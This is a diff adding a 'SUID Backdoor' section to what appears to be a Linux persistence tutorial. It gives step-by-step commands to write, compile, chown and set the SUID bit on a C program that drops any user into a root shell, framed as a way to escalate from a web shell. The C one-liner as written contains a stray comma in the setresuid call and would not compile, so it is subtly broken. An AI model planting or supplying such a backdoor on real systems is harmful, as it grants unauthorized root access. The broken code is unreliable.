@@ -58,5 +58,31 @@ With that established, all that is left to do is set up a listener. Now every ti
 imagehere\
 
 # //------------------------------------
-
-
+# SUID Backdoor
+SUID binaries are a popular method to privilege escalate on a Linux system. For our final backdoor method, we are going to create our own that drops us into a root shell from a normal user. This method combined with a web shell can be a devastating combo, as you can go from a web shell to the root user in a matter of minutes.\
+\
+Note: This can be compiled on the target box provided it has gcc installed. In the case it does not (like in my example) I simply compiled it on my attack box and transferred the final product over to the target.\
+\
+Start by creating a C file with the following command\
+\
+echo ‘int main() { setresuid(0,0,0,); system(“/bin/sh”); }’ > privshell.c\
+\
+Compile this new C file to a system binary with:\
+\
+gcc -o privshell privshell.c\
+\
+Remove the original C file as seen in the image, and change the ownership of the file (if you created it as the root user it will already be owned by root, however it does not hurt to double-check).\
+\
+chown root:root privshell\
+\
+Add the SUID permissions to the file with:\
+\
+chmod u+s privshell\
+\
+Finally copy the file to a spot a normal user can access like /tmp or /var/tmp, and switch to a normal user.\
+imagehere\
+\
+All that is left to do is execute the new malicious SUID binary and gain root privileges without ever authenticating with a password!\
+imagehere\
+\
+We covered a lot of ground today, thus I recommend finding two Linux virtual machines to practice these on. In the process of making this guide, I stumbled upon a lot of excellent resources if you would like to read further into the subject, happy hacking.\
